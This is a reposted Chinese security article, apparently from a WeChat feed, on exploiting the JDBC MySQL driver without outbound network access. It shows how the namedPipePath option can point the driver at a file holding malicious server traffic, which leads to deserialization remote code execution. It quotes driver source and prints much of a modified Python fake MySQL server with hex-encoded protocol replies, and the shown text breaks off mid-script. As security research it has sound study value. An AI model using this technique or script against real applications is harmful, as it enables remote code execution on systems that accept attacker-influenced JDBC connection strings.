---
title: 【转载】从JDBC MySQL不出网攻击到spring临时文件利用
url: https://mp.weixin.qq.com/s/8oqToAK4G9sJ7VOI5atPEQ
source: Doonsec's feed
date: 2026-05-23
fetch_date: 2026-05-24T05:59:46.436338
---

# 【转载】从JDBC MySQL不出网攻击到spring临时文件利用

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/DJX1rNqJe4nXvu6mJdu8Rmbn4zQefVe55JmD2BxdgLp8sdtaGJYTPzwdXBaQwNYiaYn4KGwxCRf8a8aSI5zF3eXfoic4tJHGeaUXzegOicVbIA/0?wx_fmt=jpeg)

# 【转载】从JDBC MySQL不出网攻击到spring临时文件利用

m4x
m4x

隐雾安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

好文推荐

文章作者：先知社区(m4x)

文章来源：https://xz.aliyun.com/news/17830

# 0x00 传统攻击流程

我们之前传统的攻击流程由以下几个步骤来完成

1. 攻击者找到可以控制目标JDBC连接fakeServer的地方
2. 目标向fakeServer发起连接请求
3. fakeServer向目标下发恶意数据包
4. 目标解析恶意数据包并完成指定攻击行为（文件读取、反序列化），完成攻击

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnYm6abVBnsc9gTr7fSnfYst7bicZaPRAk2mmQW1CkUEIcXtgibd1mpw6L67LxKltrOp18t9y0ZNRXQ/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic&watermark=1#imgIndex=0)

这种攻击方式需要依赖网络外连恶意服务器，容易被流量设备监测，且在网络隔离环境下无法进行攻击。因此我对JDBC-MySQL驱动的源码进行分析，找到一个可以在网络隔离的情况下进行反序列化RCE的方法。

# 0x01 MySQL驱动的socketFactory

注： 本文提到的MySQL驱动指的都是JDBC-MySQL驱动

首先，在MySQL驱动中我发现了socketFactory这个选项，它默认值为`StandardSocketFactory.class.getName()`因此它接收的应该是一个类的名字

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnYm6abVBnsc9gTr7fSnfYs9nPu6JxXuIL5Wf8ibZszciaDwBb4keibMvgCUxMaQuprMicIePJJzlpg1w/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic&watermark=1#imgIndex=1)

查找使用到这个选项的地方，在创建一个MysqlIO的时候使用到了这个选项传入的内容

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnYm6abVBnsc9gTr7fSnfYsDvaP6QdjloPQx9Z8u4UFVLDFYF4eibNx9eib7QlQ8fiazzDQ0GhDjyVJw/640?wx_fmt=png&from=appmsg&wxfrom=13&tp=wxpic&watermark=1#imgIndex=2)

MysqlIO在mysql驱动中是一个比较核心的类，在里面有很多的处理逻辑，构造方法如下：

```
  public MysqlIO(String host, int port, Properties props,        String socketFactoryClassName, MySQLConnection conn,        int socketTimeout, int useBufferRowSizeThreshold)
```

socketFactoryClassName是我们的重点关注参数，在createSocketFactory中实现了这样的代码，socketFactoryClassName指定的类名会被调用newInstance来实例化，且这个类必须实现了SocketFactory接口

```
private SocketFactory createSocketFactory() throws SQLException {        try {            if (this.socketFactoryClassName == null) {                throw SQLError.createSQLException(Messages.getString("MysqlIO.75"), //$NON-NLS-1$                    SQLError.SQL_STATE_UNABLE_TO_CONNECT_TO_DATASOURCE, getExceptionInterceptor());            }
            return (SocketFactory) (Class.forName(this.socketFactoryClassName)                                         .newInstance());        } catch (Exception ex) {            SQLException sqlEx = SQLError.createSQLException(Messages.getString("MysqlIO.76") //$NON-NLS-1$                 +this.socketFactoryClassName +                Messages.getString("MysqlIO.77"),                SQLError.SQL_STATE_UNABLE_TO_CONNECT_TO_DATASOURCE, getExceptionInterceptor());
            sqlEx.initCause(ex);
            throw sqlEx;        }    }
```

在初始化MysqlIO的时候createSocketFactory会被调用，用于提供一个客户端和服务器连接的方式

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnYm6abVBnsc9gTr7fSnfYsUpDyF1rMvd6uhbhUXyJRYERyMcc1S6sFYuRd71qEraAOOaYxGfB5xw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=3)

由于指定的类是必须实现了SocketFactory接口的，因此可以很方便的找到驱动中内置的满足条件的类，其实只有两个

1. StandardSocketFactory
2. NamedPipeSocketFactory

从一开始的socketFactory选项定义处可以发现，`StandardSocketFactory`这个类是默认值，其实它就是实现了TCP的连接方式，这种方式需要网络连接Mysql Server，不符合我们本次的不出网目标，因此忽略。而从`NamedPipeSocketFactory`类中的connect方法中看到，它使用了NamedPipeSocket并传入一个path作为参数，并且将实例化后的对象用作一个与服务器交互的通道：

```
public Socket connect(String host, int portNumber /* ignored */,            Properties props) throws SocketException, IOException {        String namedPipePath = props.getProperty(NAMED_PIPE_PROP_NAME);
        if (namedPipePath == null) {            namedPipePath = "\\\\.\\pipe\\MySQL"; //$NON-NLS-1$        } else if (namedPipePath.length() == 0) {            throw new SocketException(Messages                    .getString("NamedPipeSocketFactory.2") //$NON-NLS-1$                    + NAMED_PIPE_PROP_NAME                    + Messages.getString("NamedPipeSocketFactory.3")); //$NON-NLS-1$        }
        this.namedPipeSocket = new NamedPipeSocket(namedPipePath);
        return this.namedPipeSocket;    }
```

而在NamedPipeSocket的构造方法中发现，它用`RandomAccessFile`打开了一个文件，并且最终使用这个文件流作为与服务器连接的IO通道

![图片](https://mmbiz.qpic.cn/mmbiz_png/PJcQz9vmUicnYm6abVBnsc9gTr7fSnfYsOrzibR9KKU1ciauqiciaJZ605FicOkcB125jMtfscOb1VW4uqDMD4sojic2w/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=4)

再去确认这个filePath是否可以从JDBC URL中控制，在connect方法中获取了`NAMED_PIPE_PROP_NAME`这个参数：

```
String namedPipePath = props.getProperty(NAMED_PIPE_PROP_NAME)
```

`而``NAMED_PIPE_PROP_NAME`的定义如下：

```
public static final String NAMED_PIPE_PROP_NAME = "namedPipePath"; //$NON-NLS-1$
```

`因此我们只需要在JDBC的URL中传入``namedPipePath`参数，就可以控制这个文件路径。

# 0x02 初步实现不出网利用

# 我们发现了可以通过文件IO的方式与MySQL Server进行交互，因此有了个想法：将FakeServer下发的恶意流量放到文件中，再通过NamedPipeSocket的方式去发起连接，是不是就可以无网完成利用了？很明显这样的方式是可行的，下面完成这个想法的实现：

## 构造恶意流量数据包

首先我们需要一个恶意流量包，以攻击CC5反序列化为例子，可以使用开源工具完成这一步，也可以使用下面这个我修改过的FakeServer:

```
import socketimport threading
SHOW_VARIABLES = False
def get_data(pdata = b''):    global SHOW_VARIABLES    if b'SHOW VARIABLE' in pdata.upper():        print("回显变量")        SHOW_VARIABLES = True        return "01000001025200000203646566001173657373696f6e5f7661726961626c65731173657373696f6e5f7661726961626c65730d5661726961626c655f6e616d650d5661726961626c655f6e616d650c2100c0000000fd01100000004200000303646566001173657373696f6e5f7661726961626c65731173657373696f6e5f7661726961626c65730556616c75650556616c75650c2100000c0000fd000000000005000004fe000022001a000005146368617261637465725f7365745f636c69656e7404757466381e000006186368617261637465725f7365745f636f6e6e656374696f6e04757466381b000007156368617261637465725f7365745f726573756c747304757466381a000008146368617261637465725f7365745f73657276657204757466381c0000090c696e69745f636f6e6e6563740e534554204e414d455320757466381800000a13696e7465726163746976655f74696d656f7574033132301900000b166c6f7765725f636173655f7461626c655f6e616d657301311c00000c126d61785f616c6c6f7765645f7061636b65740831363737373231361800000d116e65745f6275666665725f6c656e6774680531363338341500000e116e65745f77726974655f74696d656f75740236301900000f1071756572795f63616368655f73697a650731303438353736150000101071756572795f63616368655f74797065034f4646930000110873716c5f6d6f6465894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e120000121073797374656d5f74696d655f7a6f6e6500110000130974696d655f7a6f6e650653595354454d26000014157472616e73616374696f6e5f69736f6c6174696f6e0f52455045415441424c452d524541441d0000150c74785f69736f6c6174696f6e0f52455045415441424c452d52454144110000160c776169745f74696d656f75740331323005000017fe01002200"    elif b'SHOW WARNINGS' in pdata.upper():        print("回显告警")        return "01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000005000005fe000002006a000006075761726e696e6704313336365c496e636f727265637420737472696e672076616c75653a20275c7844365c7844305c7842395c7846415c7842315c7845412e2e2e2720666f7220636f6c756d6e20275641524941424c455f56414c55452720617420726f772034383505000007fe00000200"    elif b'SELECT @@session.auto_increment_increment'.upper() in pdata.upper():        print("回显auto_increment_increment")        return "0100000101380000020364656600000022404073657373696f6e2e6175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a00000000005000003fe0000020002000004013105000005fe00000200"    elif b'SELECT @@session.autocommit'.upper() in pdata.upper():        print("回显autocommit")        return "01000001012a0000020364656600000014404073657373696f6e2e6175746f636f6d6d6974000c3f000100000008800000000005000003fe0000020002000004013105000005fe00000200"    elif b'SHOW COLLATION' in pdata.upper():        print("回显COLLATION")        return "0100000106530000020364656612696e666f726d6174696f6e5f736368656d610a434f4c4c4154494f4e530a434f4c4c4154494f4e5309436f6c6c6174696f6e0e434f4c4...